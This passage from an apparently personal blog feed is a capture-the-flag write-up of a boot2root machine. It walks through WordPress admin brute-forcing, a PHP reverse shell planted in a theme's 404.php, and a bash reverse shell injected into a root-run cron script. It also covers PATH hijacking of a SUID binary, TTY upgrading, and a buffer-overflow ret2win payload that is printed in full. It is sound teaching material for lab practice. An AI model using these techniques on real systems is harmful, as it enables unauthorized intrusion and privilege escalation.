alt="wordpress-look"></p><p>Okay wordpress site running here hmm website inside website interesing<br>i’ll repeat same step as earlier , going to run <strong>go buster</strong> against this site and simultaneously walking around this site it might possible we come up with some hint or any secret hidden info like we found previously </p><p>as this is wordpress CMS site we can use wordpress scanner(<strong>used to scan WordPress websites for known vulnerabilities both in WordPress and commonly used WordPress plugins and themes</strong>.) but ‘cause i was facing some issue in my WP scanner therefore i didn’t able to .</p><p>switch -u  for target URL -w for wordlist and -x to include desirable extensions</p><p><img src="/imgs/post2/gobuster-scan3.png" alt="gobuster-scan3"></p><p>so go-buster busted with these directory most tempting one is <strong>&#x2F;wp-login.php</strong> although tried remaining nothing got there , lets jump to <strong>&#x2F;wp-login.php</strong> </p><p><img src="/imgs/post2/wp-login.png" alt="wp-login"></p><p>apeared this login page , we require username and password to login into wordpress dashboard<br>hmm … what now ?<br>at this moment i went all the way back and continued to retrace my step noted down all the assets i discoverd from the start and those are :</p><blockquote><p><strong>part1 - user : pwner<br>par2 - there y0u go - “__m__o__n”</strong><br>binary password - <code>durge5h3#*9sd</code><br>xored string - <code>&amp;70%&#39;w*qah&#123;1&amp;</code> </p></blockquote><p>i tried pwner as username and password as <code>durge5h3#*9sd</code>  , username : pwner, password:  <code>&amp;70%&#39;w*qah&#123;1&amp;</code> but no use , i still doubt on <code>&amp;70%&#39;w*qah&#123;1&amp;</code>  , sweated blood for this, no use?</p><p>And silly me i did brute force on username field and got admin as a username, i should have tried some default and most usefull credentialls which are mostly used bydefault i.e admin:admin, admin:password, admint:root123, admin:pass123 and what not. </p><p>now <strong>admin</strong> as a username then  <code>&amp;70%&#39;w*qah&#123;1&amp;</code>  as password  and guess what ?</p><p><img src="/imgs/post2/dashboard.png" alt="dashboard"></p><p><img src="/imgs/post2/yeah-bwoi-grin.gif" alt="yeah-bwoi-grin.gif"></p><h1 id="Gaining-Access"><a href="#Gaining-Access" class="headerlink" title="Gaining Access"></a>Gaining Access</h1><p>We logged in as admin, now questions arises what next? what if someone did able to login into wordpress admin dashboard ?</p><p><strong>They will have access to a wide range of features and functions that allow them to manage the content and settings of the WordPress site. This includes the ability to create and publish new posts and pages, manage users and permissions, install and activate plugins and themes, and make changes to the site’s appearance and settings.</strong> </p><p>okay so he has privilege to do lot , as we are hunting for <strong>root</strong> flag we require to access to system somehow, so with my goal in mind started thinking about getting a reverse shell as we are aware this machine running apache server where site is hosted on localhost okay so since server is apache backend development language is most probably gonna PHP isn’t it ?</p><p>Getting php reverse shell but how?<br>As we are admin now we can acess, read and write any file we have to look for any php file where we can place our php shell and run that file since we will be listening for connection successfully able to get local user privileged shell on system </p><p>Now which file to place our php shell into ? yeah <strong>404.php</strong>  if you know how <strong>404.php</strong> file work if we try to acess any page that is moved or if we <strong>misspelled URL</strong> then we pop with 404.php page </p><p>so when we write our reverse shell here and <strong>typo</strong> URL deliberately our shell get executed and this way we manage to make connection with machine .</p><p>location of 404.php page : Tools -&gt; Theme File Editor -&gt; look at the right side <strong>Theme Files</strong> section and search for 404.php page in our case located at <strong>inc&#x2F;patterns&#x2F;404.php</strong> </p><p>okay so lets replace ALL code with php <a href="">reverse shell</a> and replace the ip address with your machine then Update File  </p><p><img src="/imgs/post2/404-page.png" alt="404-page"></p><p>Start netcat listener on give port i.e. 6666 here and then misspelled URL and hit enter that makes php script execute </p><p><img src="/imgs/post2/nc-conn.png" alt="nc-conn"></p><p>Voila ! we got our shell with user <strong>www-data</strong> :(</p><p><img src="/imgs/post2/nc-shell.png" alt="nc-shell"></p><p>okay now lets see what we can do here ,if we list the current directory there flag.txt file</p><p><img src="/imgs/post2/part3-flag.png" alt="part3-flag"></p><p><img src="/imgs/post2/part2-flag2.png" alt="part2-flag2"></p><p>okay so this is part3 credential we had to find lets decode the cipher text via <a href="https://gchq.github.io/CyberChef/">Cyberchef</a><br>after decoing other previous encoded string now we can recognize from the pattern of this text belong from base encoding format so i tried base64 and base32 out of which base32 make more sense </p><p><img src="/imgs/post2/cyberchef.png" alt="cyberchef"></p><p>if we see output it all alphabetic chars here but doesn’t make sense not able to read single word it seems like chars are interchanged with any other chars to make thing robust, hmm… so if you know about this technique it’s called substituion (In cryptography, a substitution cipher is a method of encrypting in which units of plaintext are replaced with the ciphertext) there are some substitution technique tried one by one some of them and eventually end up with ROT13</p><p><img src="/imgs/post2/cyberchef2.png" alt="cyberchef2"></p><p>Output :</p><blockquote><p>wow 0.0 you really did it, way to go !!!<br>  have it, and go ahead<br>  “”” letm3log1n “”” </p></blockquote><p>okay now we have all 3 part credentials .</p><ul><li>part1 -&gt; username: pwner</li><li>par2 -&gt; “__m__o__n” </li><li>part3 -&gt; letm3log1n</li></ul><p>now lets solve the puzzle , skipping part2 as it was part3’s incomplete form , left with part1 and par2 no need to think too much these are username and password maybe for making connection with machine , we can do it using ssh </p><p><img src="/imgs/post2/pwner-shell.png" alt="pwner-shell"></p><p>and hell yeah we got the local use shell here , not prolonging anymore started exploring this user account ,there two files i.e. README.txt and user1.txt in home directory </p><p><img src="/imgs/post2/pwner-shell2.png" alt="pwner-shell2"></p><p>user1.txt contain the flag(not root flag :( ) okay so it isn’t over yet .</p><p><img src="/imgs/post2/pwner-readme.png" alt="pwner-readme"></p><p>in README.txt file talking ‘bout <strong>history</strong> computer science maybe hint to proceed ahead okay lets keep in mind </p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>We have to escalate our privilege to root user to get the root flag </p><p>Two way to proceed<br>-&gt; With tool :- where we run the tool in the user system and try to get the vulnerable point to bypasses the proper authorization channel, and successfully grants themselves access to data we are not supposed to have<br>-&gt; Manually: try to achieve same goal manually</p><h3 id="Manually"><a href="#Manually" class="headerlink" title="Manually"></a>Manually</h3><blockquote><p>Throughout entire privilege escalation i didn’t have to use automation tool but for the sake of intro to automation tool or how to automate privesc i did use during escalting to root user.</p></blockquote><p>i followed <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users">this</a> methodology </p><p><img src="/imgs/post2/etc-pass.png" alt="etc-pass"></p><p>came to know there is two more local user i.e. alice, bob and if we check last login history user  was also loged in as bob </p><p><img src="/imgs/post2/last-login.png" alt="last-login"></p><p>rememberd from history README.txt file was talking about history computer science lets print history utility and see if we get any juicy info </p><p><img src="/imgs/post2/history.png" alt="history"></p><p>okhayyy, i was right look at line number 8 and 9 user logged in into mysql databse and granting privilege to user <strong>alice</strong> , okay now we know the password of user alice we can login using command<br><strong>su alice</strong> </p><p><img src="/imgs/post2/alice-shell.png" alt="alice-shell"></p><p>easypeasy, now we are user alice !</p><p><img src="/imgs/post2/alice-shell2.png" alt="alice-shell2.png"></p><p>listing the current directory we get user flag and README.txt file  </p><p><img src="/imgs/post2/alice-flag.png" alt="alice-flag"></p><p><img src="/imgs/post2/alice-readme.png" alt="alice-readme"></p><p>hmm…  talking about shedule so if you know<br>In Unix-like operating systems The cron command-line utility is a job scheduler. Users who set up and maintain software environments use cron to schedule jobs, also known as cron jobs, to run periodically at fixed times, dates, or intervals.<br>and for that purpose we use <a href="https://www.geeksforgeeks.org/crontab-in-linux-with-examples/">crontab</a> </p><p>is table that contain list of all task we want to run at specific time , <strong>location</strong> -&gt; &#x2F;etc&#x2F;crontab </p><p><img src="/imgs/post2/crontab.png" alt="crontab"></p><p>look at the last two lines there is shell script al location <strong>&#x2F;opt&#x2F;scripts&#x2F;pwn2own.sh</strong> running after every 30 sec by user <strong>bob</strong> and in last line user <strong>root</strong> overwriting that script with some <strong>base64</strong> decoded string and then changing file owner to alice and setting wirte permission </p><p>after decoding that base64 string </p><p><img src="/imgs/post2/cron-base64.png" alt="cron-base64"></p><p>okay nothing usefull, butttt we know that <strong>crontab</strong> run as root user </p><p><img src="/imgs/post2/cron-perm.png" alt="cron-perm"></p><p>so it means that <strong>pwn2own.sh</strong> script going to run as bob and what we can do is we can place our bash <a href="https://www.revshells.com/">reverse shell</a> into that script before 30 sec or after 1 minute as script run within each 30 sec and overwrite after every 1 minute </p><p><img src="/imgs/post2/bash-shell2.png" alt="bash-shell"></p><p>We’ve a shell but when we <strong>ctrl+c</strong> we can miss it, we should it upgrade like in the below:</p><p><strong>-The first thing</strong>: to do is use <strong>python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</strong>, which uses Python to spawn a better-featured bash shell. At this point, our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the <strong>arrow keys</strong>, and <strong>Ctrl + C</strong> will still kill the shell.  </p><p>-<strong>Step two is</strong>: <strong>export TERM&#x3D;xterm</strong> — this will give us access to term commands such as clear.  </p><p>-<strong>Finally</strong> <strong>(and most importantly)</strong> we will background the shell using <strong>Ctrl + Z</strong>. Back in our own terminal we use <strong>stty raw -echo; fg</strong>. This does two things: first, it turns off our own terminal echo (which gives us access to <strong>tab autocompletes</strong>, <strong>the arrow keys</strong>, and <strong>Ctrl + C</strong> to kill processes). It then foregrounds the shell, thus completing the process.  </p><p>-<strong>Note</strong> <strong>that if the shell dies</strong>, any input in your own terminal will not be visible (as a result of having disabled terminal echo). <strong>To fix this</strong>, type <strong>reset</strong> and press enter.</p><p><img src="/imgs/post2/tty-upgrade.png" alt="tty-upgrade"></p><p><img src="/imgs/post2/perfect.gif" alt="perfect"></p><p>Started digging again , in current directory we have user3 flag and README.txt file </p><p><img src="/imgs/post2/bob-shell.png" alt="bob-shell"></p><p>README.txt talking about <strong>Secure Coding</strong> okay lets keep in mind and enemurate the <strong>bob</strong> user’s account<br>using tool <a href="https://github.com/rebootuser/LinEnum">linenum</a>(LinEnum is a script that search for possible paths to escalate privileges on Linux&#x2F;Unix*&#x2F;MacOS hosts)</p><p>so i donloaded <strong>linenum</strong> and copied to target machine using <strong>SCP</strong> utility you can also use python server </p><p><img src="/imgs/post2/scp-linenum.png" alt="scp-linenum"></p><blockquote><p>Note: we don’t know either the password of bob or have write permission in bob home directory so we have to copy in &#x2F;tmp directory.</p></blockquote><p>change the script permision -&gt; <strong>chmod +x linenum</strong> and execute it </p><p><img src="/imgs/post2/linenum-res.png" alt="linenum-res"></p><p>okay now we have our linenum running lets go through all output and look for some juicy info<br>hmm.. its lot but going all over output i came with most luring info <strong>Crontab Contents</strong> which we already now about and <strong>SUID files</strong>  </p><p><strong>SUID</strong>: It is special file permission for executable files. This enables other users to run the file with the effective permissions of the file owner. But Instead of normal x which represents executable permissions. We will see s(this indicates SUID) special permission for the user.<br>i’ll highy recommend you to go throuugh this <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">blog</a> </p><p><img src="/imgs/post2/suid-bin.png" alt="suid-bin"></p><p>where i got two strange file i.e. <strong>root-me</strong> and <strong>final</strong> , surprisingly final was in bob home location inside <strong>.something</strong> dir </p><blockquote><p>I am assuming that you know about SUID permission and how to abuse SUID bit set binary if not then go through this <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">blog</a> </p></blockquote><h3 id="Gaining-root-privilege-01"><a href="#Gaining-root-privilege-01" class="headerlink" title="Gaining root privilege - 01"></a>Gaining root privilege - 01</h3><p>running <strong>root-me</strong> binary </p><p><img src="/imgs/post2/root-me-res.png" alt="root-me-res"></p><p>it seems like binary is making request to <a href="https://pastebin.com/dl/JicYuAuW">https://pastebin.com/dl/JicYuAuW</a> and being saved as <strong>JicYuAuW</strong><br>browsing this URL </p><p><img src="/imgs/post2/wget-url.png" alt="wget-res"></p><p>nothing just a dummy Loream Ipsum. , but how this reqest being made ?<br>most probably using <strong>wget</strong> utility and called by <strong>system</strong> function(at this time i was just assuming) to make sure i transfered this binary to my machine and decompiled it using ghidra </p><p><img src="/imgs/post2/wget-decomp.png" alt="wget-decomp"></p><p>and i was right . <strong>system</strong> function is used for make request via wget and if we go back and read the README.txt file again <strong>system</strong> function is vulnerable function </p><p>Because system invokes <em>&#x2F;bin&#x2F;sh</em> -c to execute commands, it uses whatever environment variables are configured for the user who executes the program, the most notable of these is the <em>PATH</em> environment variable.</p><p>If the programmer forgets to specify the full path for a binary, &#x2F;bin&#x2F;sh will check each of the locations on the <em>PATH</em> in order until it finds an executable with the correct name, as soon as it finds one it executes it with the permissions of the owner of the calling program. </p><p>so you can see how this could be used for privilege escalation , didn’t get how? lemme </p><p>as here full path of <strong>wget</strong> utility is not specified what we can do is change <strong>PATH</strong> environmeent var to our current directory and create a our own one(wget) where we can write reverse shell or copy the <strong>&#x2F;bin&#x2F;sh</strong> binary as <strong>Evil</strong> via <strong>system</strong> function and ‘cause binary has SUID bit set we’ll prefix sudo to make our Evil binary(bad) run </p><p><img src="/imgs/post2/Evil-code.png" alt="Evil-code"></p><p><img src="/imgs/post2/Evil-code2.png" alt="Evil-code2"></p><p><img src="/imgs/post2/Evil-code3.png" alt="Evil-code3"></p><blockquote><p>Note :  while writing this writeup i realized that we require to have bob password to run the Evil(bad) file , i thought to leave password as a simple text file in bob’s home direcotry but as it is a CTF machine there would be no fun having sweet without any hustle so i created a simple OSINT challenge for bob pass.</p></blockquote><h3 id="Bob-password"><a href="#Bob-password" class="headerlink" title="Bob password"></a>Bob password</h3><p><img src="/imgs/post2/osint/osint1.png" alt="osint1"></p><p>navigating to <strong>p455w0rd</strong> directory , there is image file named <strong>osint.jpg</strong> </p><p><img src="/imgs/post2/osint/osint2.png" alt="osint2"></p><p>we have to download it first, you can use <strong>scp</strong>, <strong>python server</strong> or you can just copy the file to <strong>&#x2F;var&#x2F;ftp</strong> and download it from <strong>FTP</strong> server using <strong>get</strong> command </p><p><img src="/imgs/post2/osint/osint3.png" alt="osint3"></p><p>now we have image file lets go for low hanging fruites first like we did earlier after running exiftool over image file came up with </p><p><img src="/imgs/post2/osint/osint4.png" alt="osint4.png"></p><p>in comment section there is a line of information i.e. -  <strong>Do you know ‘Avram Veda’ and bob is best friend and he know every secret of bob, to know bob’s secret you should know Avram well</strong><br>you can also run <strong>strings</strong> command e.g. </p><p><img src="/imgs/post2/osint/osint5.png" alt="osint5.png"><br>solving<br>so here this hint or i didn’t know at that point says that <strong>Avram Veda</strong> and <strong>bob</strong> is best friend and Avaram know some secret of bob, so we know bob already right?  bob is a user we are currently logged in as and we here <strong>secret</strong> is most probably password of bob user as we need bob pass to make our privesc work<br>and we didn’t come across Avram Veda name throughout solving the machine and also we been told that we should know Avram first to know bob’s secret </p><p>hmmm maybe its osint challenge obviously as name of image file isss osing.jpg<br>okay so now we only have this person name to start with.</p><p>searching this name on google directly is no use ‘cause you know how google crawler work it will index all relevent things whit this name and we will be keep searching and clicking irrelevent things </p><p>so for searching any person we can use social media side like - Twitter, instragram , facebook and so on<br>for that we also have automated by using these tool we can search in all social media site at once </p><p>but here i tried manually first in Twitter and ther i got a user with same name </p><p><img src="/imgs/post2/osint/osint6.png" alt="osint6.png"></p><p>also bio  <strong>p2w</strong> look familiar i.e. Pwn2Own(this CTF name)<br>okay so let see what we get here </p><p><img src="/imgs/post2/osint/osint7.png" alt="osint7.png"></p><p>as you can see this guy have some Tweets &amp; replies too, i copied first tweet that is in base64 form and decoded it </p><p><img src="/imgs/post2/osint/osint8.png" alt="osint8"></p><p>okay nothing here, lets see second tweet<br>i had no idea for this cipher string so i aplied all cipher that i came across before </p><p><img src="/imgs/post2/osint/osint9.png" alt="osint9"></p><p>and it was <strong>ROT47</strong> and we have our output as github link so lets navigate to this link</p><p><img src="/imgs/post2/osint/osint10.png" alt="osint10"></p><p>this account has only one repositores named i.e. <strong>ohsint</strong> lets go this repositories </p><p><img src="/imgs/post2/osint/osint11.png" alt="osint11"></p><p>only one file here which is README.md that contain lines of dummy Lorem ipsum looking each line closely nothing got meainingful.<br>if you know about the github commit feature we can see the commit history of repository and made changes so as you can see the right side of the file name 4 commits made </p><p><img src="/imgs/post2/osint/osint12.png" alt="osint12"></p><p>looking into last commit</p><p><img src="/imgs/post2/osint/osint13.png" alt="osint13"></p><p>changes on line number 5 it looks flag with link lets go to this URL </p><p><img src="/imgs/post2/osint/osint14.png" alt="osint14"></p><p>okay so its pastebin file with Title <strong>find me</strong> and with paste <strong>35.487628827907535, 138.7815797959812</strong> it looks like latitude and longitude(latitude and longitude, coordinate system by means of which the position or location of any place on Earth’s surface can be determined and described.) we can search this  coordinates on Google Map like </p><p><img src="/imgs/post2/osint/osint15.png" alt="osint14"></p><p>so its shop in japan, wow Avram is in Japan.<br>we are not able to see shop name though but by clicking just near to destination mark we can see shop name its <strong>Ichiraku Ramen</strong> </p><p><img src="/imgs/post2/osint/osint15.2.png" alt="osint15.2."></p><p>i tried this name as a password(both word separately) but it wasnt so i continued my research and finally got the flag. how? lemme show </p><p><img src="/imgs/post2/osint/osint16.gif" alt="osint16"></p><p>so its bob’s password.</p><h3 id="Gaining-root-privilege-02"><a href="#Gaining-root-privilege-02" class="headerlink" title="Gaining root privilege - 02"></a>Gaining root privilege - 02</h3><p>running <strong>final</strong> binary </p><p><img src="/imgs/post2/final-res.png" alt="final-res"></p><p>woah! , hacker man apeared :D<br>entering random value and getting output <strong>8</strong> one thing to note here that on each random value output is same , and if we enter any long input(A’s here) then it throw segmentation fault err and <strong>Value of Number Is</strong> changes to 41414141 which is hex version of <strong>A</strong> char </p><p><img src="/imgs/post2/final-res2.png" alt="final-res2"></p><p>so we can cleary see that we are able to write on stack here, which is to say binary is vulnerable to <em><strong>Buffer overflow</strong></em>(occurs when there is more data in a buffer than it can handle, causing data to overflow into adjacent storage), according to README.txt any vulnerable function is being used in binary that is not checking boundary of variable data , lets decomplie the binary with <strong>Ghidra</strong> and see whats wrong .</p><p>Looking for Functions in binary i come with this interesting function <strong>win()</strong> -</p><p><img src="/imgs/post2/final-win.png" alt="final-win"></p><p>that is basically executing <strong>&#x2F;bin&#x2F;sh</strong> shell as root user </p><p>main() function -</p><p><img src="/imgs/post2/final-mainfunc.png" alt="final-ghidra"></p><p>declared 2 variables i.e. <strong>local_38</strong> and <strong>local_c</strong> , assigned number 8 to local_c and user is asked to Enter name and value is stored in local_38 var(line 11) lastly strign - Value of Number is printed with value 8 </p><p>okay so whats wrong here? , <em><strong>gets()</strong></em>* function </p><p>The gets() function <strong>does not perform bounds checking</strong>, therefore this function is extremely vulnerable to buffer-overflow attacks. It cannot be used safely (unless the program runs in an environment which restricts what can appear on stdin ).</p><p>**Lets understand this vulnerability at core level and how can we leverage </p><blockquote><p>If you already know what Bufer Overflow is and how it work you can skip this part, jump <a href="">here</a></p></blockquote><h4 id="Program-Execution"><a href="#Program-Execution" class="headerlink" title="Program Execution"></a>Program Execution</h4><p>When we compile the code it get converted to executable format and stored into secondary storage running that executable it loaded in to <strong>RAM</strong> by OS which is to say that, that program is now no longer program it is process and we need space to store that process’s code and data to memory we use this memory architecture to store the program’s data and storage </p><p><img src="/imgs/post2/memory-layout.jpg" alt="memory-layout"></p><p>code stored in <strong>text</strong> section, initialized data(variables that contain data) stored in initialized data section and uninitialized data into uninitialied data(bss) section these data are static and public variables value then we have <strong>stack</strong> and <strong>heap</strong> section it depends on user if he want to store data with his own desirable size manually at run time then heap section is going to use as it is used for dynamically data allocation otherwise <strong>stack</strong> section.</p><p>In our program variables are already assigned storage size while declaration our data is going to store on stack storage </p><h4 id="how-stack-work"><a href="#how-stack-work" class="headerlink" title="how stack work?"></a>how stack work?</h4><p>Stacks in Data Structures is a linear type of data structure that follows the LIFO (Last-In-First-Out) principle and allows insertion and deletion operations from one end of the stack data structure, that is top. The call stack is made up of a series of stack frames, each of which corresponds to a function call that is currently being executed or has recently been executed.</p><p><img src="/imgs/post2/stack-layout.gif" alt="stack-layout"></p><p>The stack is used to store a variety of information, including:</p><ul><li><p>Local variables: These are variables that are defined and used within a particular function or block of code. When the function is called, space is allocated on the stack for the local variables.</p></li><li><p>Function arguments: When a function is called, the values of the arguments are passed to the function and stored on the stack.</p></li><li><p>Return address: When a function is called, the address in memory where the program should resume execution after the function returns is stored on the stack.</p></li><li><p>Activation records</p></li></ul><h4 id="Activation-records-Stack-frame"><a href="#Activation-records-Stack-frame" class="headerlink" title="Activation records&#x2F;Stack frame"></a>Activation records&#x2F;Stack frame</h4><p>An activation record, also known as a stack frame, is a data structure that is used to store information about a particular function call. It includes the function’s local variables, arguments, and return address, as well as other information such as the previous stack frame and any saved registers. Activation records are created and destroyed as functions are called and return, respectively.</p><p><img src="/imgs/post2/stack-frame.jpg" alt="stack-frame"></p><h4 id="Registers"><a href="#Registers" class="headerlink" title="Registers"></a>Registers</h4><p><a href="https://en.wikipedia.org/wiki/Processor_register">Registers</a> are small, high-speed storage locations within the CPU (central processing unit) of a computer. They are used to hold data and instructions that the CPU is currently working on or needs quick access to. There are several types of registers that are used for different purposes in a CPU. Most importand register to now for this challenge is SP,FP,IP</p><p>SP(Stack Pointer) - This is a register that holds the address of the top of the stack in memory.</p><p>FP(Frame Pointer) - The frame pointer register (also known as the base pointer or BP register) is a register in the CPU that is used to hold the address of the current stack frame in a call stack.</p><p>IP(Instruction Pointer) - The instruction pointer register (also known as the program counter or PC register) is a register in the CPU that holds the address of the next instruction to be executed by the CPU.</p><h4 id="Calling-convention"><a href="#Calling-convention" class="headerlink" title="Calling convention"></a>Calling convention</h4><p>A calling convention is a set of rules that specifies how function arguments are passed to a function and how the function return value is returned to the caller. It also specifies the order in which the arguments are passed and the location in memory where they are stored. go throuhg this <a href="https://stackoverflow.com/questions/10057443/explain-the-concept-of-a-stack-frame-in-a-nutshell">page</a> </p><h5 id="Now-we-know-the-all-base-knowlege-to-understand-buffer-overflow-attack-lets-see-how-buffer-overflow-can-be-performed-and-how-can-we-execute-any-arbitary-code-into-memory-or-transfer-code-flow-to-any-evil-function"><a href="#Now-we-know-the-all-base-knowlege-to-understand-buffer-overflow-attack-lets-see-how-buffer-overflow-can-be-performed-and-how-can-we-execute-any-arbitary-code-into-memory-or-transfer-code-flow-to-any-evil-function" class="headerlink" title="Now we know the all base knowlege to understand buffer overflow attack lets see how buffer overflow can be performed and how can we execute any arbitary code into memory or transfer code flow to any evil function"></a>Now we know the all base knowlege to understand buffer overflow attack lets see how buffer overflow can be performed and how can we execute any arbitary code into memory or transfer code flow to any evil function</h5><p>when main function is called this is how stack frame is created for program <strong>final</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Higher addr         +-------------------+ ----------</span><br><span class="line">| saved temporaries |     ^</span><br><span class="line">+-------------------+     |</span><br><span class="line">| function argument |     |</span><br><span class="line">+-------------------+     | </span><br><span class="line">| function argument |     |</span><br><span class="line">+-------------------+   main function</span><br><span class="line">| Return address    |     |</span><br><span class="line">+-------------------+     | </span><br><span class="line">    FP --&gt;| saved RBP         |     |</span><br><span class="line">+-------------------+     |</span><br><span class="line">| local var buff    |     |</span><br><span class="line">+-------------------+     |</span><br><span class="line">| local var number  |     v</span><br><span class="line">        SP --&gt; +-------------------+ ----------</span><br><span class="line">|                   |    </span><br><span class="line">Lower addr+-------------------+      </span><br></pre></td></tr></table></figure><p>now we know vulnerable function(gets()) function is used to store value to variable <strong>local_38</strong> however, variable local_38 size is fixed(44 byte) ‘cause gets() function do not perform bound checking operation<br>we can somehow exceed that limit by random values or <a href="https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/">shellcode</a>(Shellcode is sequence of machine code, or executable instructions, that is injected into a computer’s memory with the intent to take control of a running program)  and overwrite the <strong>Return adress</strong> </p><p><img src="/imgs/post2/bof.png" alt="bof"></p><blockquote><p>Stack grows from higher address to lower address and parameter and local variables are assigned in reverse order i.e lower to higher address </p></blockquote><p>As return adress contain the address of next instruction to be execute when function return , we can calculate the offset(numbers of byte to overwrite the return address) of return address from local variable buff and replace return address with our shell code adress </p><p>But we are not going to use shell code here if you remember about <strong>win()</strong> function <strong>&#x2F;bin&#x2F;sh</strong> shell being called in this function as root user so if we replace return address to this function we will be able to get root shell </p><p><em><strong>okay enough talking let’s get our hand dirty by exploiting this vulnerbility</strong></em> </p><p>first we need calulate the offset of return adress , we will use <strong>gdb-pwndbg</strong>( GDB is a debugger for C (and C++). It allows you to do things like run the program up to a certain point then stop and print out the values of certain variables at that point, or step through the program one line at a time and print out the values of each variable after executing each line.) Python module here</p><p>so let’s open the binary in gdb and disassemble the <strong>main</strong> function </p><p><img src="/imgs/post2/final-gdb1.png" alt="final-gdb1"></p><p><img src="/imgs/post2/final-gdb2.png" alt="final-gdb2"></p><p>setting breakpoint(A breakpoint <strong>makes your program stop whenever a certain point in the program is reached</strong>.) using <code>break * &lt;addr&gt;</code> just after gets() function which is basically going to be return address in gets() stack frame so that when we run program with values we  can examine resisters </p><p>and then generating a set of special pattern using python pwntool module <strong>cyclic</strong> so that we can calculate exact offset of return address(we’ll just in time)</p><p><img src="/imgs/post2/final-gdb3.png" alt="final-gdb3"></p><blockquote><p>generating 100 cyclic values as we are not sure how many byte it will take to crash the program or write the return address</p></blockquote><p>then running the program with <em><strong>r</strong></em>(run) command where name field is our cyclic values</p><p><img src="/imgs/post2/final-gdb4.png" alt="final-gdb4"></p><p>after running the program our <strong>break point</strong> hit ,values get stored in variable precisely on stack</p><p><img src="/imgs/post2/final-gdb5.png" alt="final-gdb5"></p><p>examining the stack , with command <em><strong>x&#x2F;50x $rsp</strong></em> where x define we have to examine memory with 50 word block in hex form from stack </p><p><img src="/imgs/post2/final-gdb5.1.png" alt="final-gdb5.1"></p><p>now lets continue and check <strong>registers</strong> if we able to overwrite the return adress in <em><strong>rip</strong></em> register if we succeed program goinna break and throw segmentaion fault </p><p><img src="/imgs/post2/final-gdb6.png" alt="final-gdb6"></p><p>okay we got segmentation fault error ‘cause we overwritten the return adress and now program don’t know where to jump with that random value </p><p>now if you see <strong>ret</strong> instruction value and top of the stack you will get the pattern by which the return adress is overwriten now we just have to find out offset with those first 4 chars by using <em><strong>cyclic  -l</strong></em> </p><p><img src="/imgs/post2/final-gdb7.png" alt="gdb-final7"></p><p>and we got offset <strong>56</strong> meaning that to overwrite the return adress we need <strong>56 bytes pattern&#x2F;garbage value + adress of win function</strong> , you can get win() function either from gdb itself usging <strong>print win</strong> </p><p><img src="/imgs/post2/win-adr.png" alt="win-adr"></p><p>or usging <strong>nm</strong> utility </p><p><img src="/imgs/post2/win-nm.png" alt="win-nm"></p><blockquote><p>adress should be in <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a> form , A little-endian system stores the least-significant byte at the smallest address let say our win addr is 0x0000000000400727 then it is goint to store in reverse order <code>\x27\x07\x40\x00\x00\x00\x00\x00</code></p></blockquote><p>okay we have every thing set now our payload should work</p><p><em><strong>Payload</strong></em>  <strong>-&gt; (echo -e ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<code>\x27\x07\x40\x00\x00\x00\x00\x00</code>‘) | .&#x2F;final</strong> </p><p>switch <strong>-e</strong> enable interpretation of backslash escapes as we are using addr in hex form it should escape or else our payload won’t work</p><p><img src="/imgs/post2/exp1.png" alt="exp1"></p><p>we did able to call win() function as you can see <em><strong>[+] PWNED!!!</strong></em> msg over there<br>buttt why we didn’t get shell ?  lemme </p><p>the problem is when we echo our payload to program because pipe(|) is used here it work as input for program and then close the binary what we need here is that we don’t want the binary to close we need a intermediatary between our payload and binary so that when somthing goes as input by intermediatary output should pops out thus our payload will work and program never close and for that purpose we will use <em><strong>cat</strong></em> utility </p><p><em><strong>Payload</strong></em>  <strong>-&gt; (echo -e ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<code>\x27\x07\x40\x00\x00\x00\x00\x00</code>‘; cat) | .&#x2F;final</strong> </p><p><img src="/imgs/post2/exp2.png" alt="exp2"></p><p>Finallyyy ….</p><p><img src="/imgs/post2/iamroot.gif" alt="iamroot"></p><p>I AM ROOT! </p><p><img src="/imgs/post2/root-flag.png" alt="root-flag"></p><p><img src="/imgs/post2/wink2.gif" alt="wink"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Participating in a CTF machine challenge is a valuable learning experience for students. Not only does it provide hands-on experience in cybersecurity and penetration testing, but it also helps to develop critical thinking and problem-solving skills. I hope this write-up has inspired you to continue learning about the field of cybersecurity and to participate in more CTF challenges in the future. Remember, the only limit to your knowledge is your own willingness to learn and improve. Keep up the great work and never stop learning! </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Boot2Root </tag>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TryHackMe WriteUp: Recovery</title>
      <link href="/2022/09/12/post1/thm-recovery/"/>
      <url>/2022/09/12/post1/thm-recovery/</url>
      
